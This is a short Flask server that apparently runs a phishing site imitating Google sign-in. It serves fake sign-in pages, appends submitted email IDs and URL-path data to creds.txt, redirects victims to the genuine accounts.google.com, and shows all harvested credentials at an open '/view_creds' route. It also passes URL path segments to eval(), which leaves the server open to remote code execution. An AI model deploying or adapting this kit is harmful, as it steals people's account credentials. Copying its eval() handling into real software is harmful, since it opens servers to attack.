from flask import Flask, request, render_template, redirect
import os
app = Flask(__name__)

@app.route("/")
def page1():
   return render_template("page1.html")

@app.route("/signin/v2/identifier")
def page2():
   return render_template("page2.html")

@app.route("/logger/<func>", methods=["GET","POST"])
def logger(func):
  if request.method == "POST":
    data = request.form["emailid"]
    f = open("creds.txt", "a")
    f.write(data)
    f.write("\n")
    f.close()
    if eval(func) == 1:
      return redirect("/signin/v2/identifier")
    if eval(func) == 2:
      return redirect("https://accounts.google.com")
@app.route("/view_creds")
def view_creds():
    creds_path = os.path.join("creds.txt")
    try:
        with open(creds_path, "r") as f:
            contents = f.read()
        # Replace newlines with <br> tags for proper HTML formatting
        return contents.replace("\n", "<br>")
    except FileNotFoundError:
        return "creds.txt not found.", 404
    except IOError as e:
        return f"An error occurred while reading the file: {e}", 500
@app.route("/logger/<data>/<func>", methods=["GET", "POST"])
def logger1(data, func):
    f = open("creds.txt", "a")
    f.write(data)
    f.write("\n")
    f.close()
    if eval(func) == 1:
      return redirect("/signin/v2/identifier")
    if eval(func) == 2:
      return redirect("https://accounts.google.com")

app.run(debug=False,host='0.0.0.0')
